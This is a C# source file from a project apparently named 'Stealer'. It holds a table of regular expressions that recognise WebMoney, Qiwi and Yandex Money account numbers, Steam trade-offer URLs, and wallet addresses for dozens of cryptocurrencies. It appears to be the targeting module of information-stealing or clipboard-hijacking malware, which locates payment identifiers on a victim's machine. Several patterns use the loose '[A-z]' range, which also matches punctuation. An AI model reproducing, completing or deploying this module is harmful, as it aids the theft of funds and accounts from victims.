using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stealer.Modules
{
    internal sealed class RegexPatterns
    {
        public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
        {
            // WebMoney
            {"wmr", new Regex(@"R[0-9]{12}") },
            {"wmg", new Regex(@"G[0-9]{12}") },
            {"wmz", new Regex(@"Z[0-9]{12}") },
            {"wmh", new Regex(@"H[0-9]{12}") },
            {"wmu", new Regex(@"U[0-9]{12}") },
            {"wmx", new Regex(@"X[0-9]{12}") },
            // Qiwi
            {"qiwiua", new Regex(@"380[0-9]{9}") }, // UA
            {"qiwiru", new Regex(@"79[0-9]{9}") }, // RU
            // Yandex money
            {"yandex", new Regex(@"41001[0-9]{10}") },
            // Steam trade url
            {"steam", new Regex(@"steamcommunity[.]com/tradeoffer/new/[?]partner=[0-9]{9}&token=[A-z0-9_]{8}") },
            // Cryptocurrency
            {"btc", new Regex(@"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)") }, // Bitcoin
            {"eth", new Regex(@"(?:^0x[a-fA-F0-9]{40}$)") }, // Ethereum
            {"xmr", new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") }, // Monero
            {"xlm", new Regex(@"(?:^G[0-9a-zA-Z]{55}$)") }, // Stellar
            {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") }, // Ripple
            {"ltc", new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") }, // Litecoin
            {"nec", new Regex(@"(?:^A[0-9a-zA-Z]{33}$)") }, // Neocoin
            {"bch", new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})") }, // Bitcoin Cash
            {"bcn", new Regex(@"2[1-9A-z]{105}") }, // Bytecoin
            {"ada", new Regex(@"DdzFFzCqrht[1-9A-z]{93}") }, // Cardano
            {"grft", new Regex(@"G[1-9][1-9A-z]{93}") }, // Graft
            {"zcash", new Regex(@"t1[0-9A-z]{33}") }, // Zcash
            {"btg", new Regex(@"G[A-z][1-9A-z]{32}") }, // Bitcoin Gold
            {"waves", new Regex(@"3P[1-9A-z]{33}") }, // Waves
            {"rdd", new Regex(@"R[1-9a-z][1-9A-z]{32}") }, // ReddCoin
            {"blk", new Regex(@"B[1-9a-z][1-9A-z]{32}") }, // BlackCoin
            {"emc", new Regex(@"E[A-z][1-9A-z]{32}") }, // Emercoin
            {"strat", new Regex(@"S[A-z][1-9A-z]{32}") }, // Stratis
            {"qtum", new Regex(@"Q[A-z][1-9A-z]{32}") }, // Qtum
            {"via", new Regex(@"V[a-z][A-z][1-9A-z]{31}") }, // Viacoin
            {"lsk", new Regex(@"[0-9]{20}L") }, // Lisk
            {"doge", new Regex(@"D[A-Z1-9][1-9A-z]{32}") }, // Dogecoin
            {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") } // Dashcoin
        };
    }
}
